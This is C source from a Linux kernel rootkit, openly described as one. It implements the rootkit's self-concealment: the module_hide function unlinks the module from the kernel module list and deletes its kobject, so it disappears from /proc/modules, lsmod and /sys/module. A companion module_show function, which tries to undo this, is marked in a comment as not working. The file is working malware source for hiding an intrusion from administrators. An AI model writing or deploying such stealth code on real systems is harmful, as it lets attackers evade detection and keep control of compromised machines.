/*
 * This file contains a set of functions for hiding the work 
 * of the rootkit. These functions include: hiding the module, 
 * hiding processes, hiding files and directories, hiding 
 * sockets, ports and network packets.
 */
#include "header/hide.h"
#include "header/config.h"



static int module_hidden = 0;
static struct list_head *module_previous;
static struct kobject *module_kobj_previous;


void module_hide(void) {
    if (!module_hidden) {
        /* Save the addr of this module to restore if necessary */
        module_previous = THIS_MODULE->list.prev;
        module_kobj_previous = THIS_MODULE->mkobj.kobj.parent;

        /* Hide from '/proc/modules' */
        list_del(&THIS_MODULE->list);

        /* Hide from 'lsmod' and '/sys/modules' */
        kobject_del(&THIS_MODULE->mkobj.kobj);

        /*
         * Remove the symbol and string tables for kallsyms
         * IF NOT SET TO NULL, IT WILL GET THE FOLLOWING ERROR MSG:
         * "sysfs group ffff8800260e4000 not found for kobject "
         */
        THIS_MODULE->sect_attrs = NULL;
        THIS_MODULE->notes_attrs = NULL;

        module_hidden = !module_hidden;

        printk("rootkit: in stealth mode module\n");
    }
}


/*
 * DON'T WORK!!!!!!!!!
 * No directories in /sys/module/rootkit/
 * It may be necessary to use: void kobject_init (struct kobject *kobj);
 */
void module_show(void) {
    if (module_hidden) {
        //add to /proc/modules
        list_add(&THIS_MODULE->list, module_previous);

        if (kobject_add(
                &THIS_MODULE->mkobj.kobj, module_kobj_previous, 
                ROOTKIT_MODULE_NAME) < 0) {
            printk("rootkit: error to restore kobject to the list back!!\n");
        }

        module_hidden = !module_hidden;

        printk("rootkit: in invisible mode module\n");
    }
}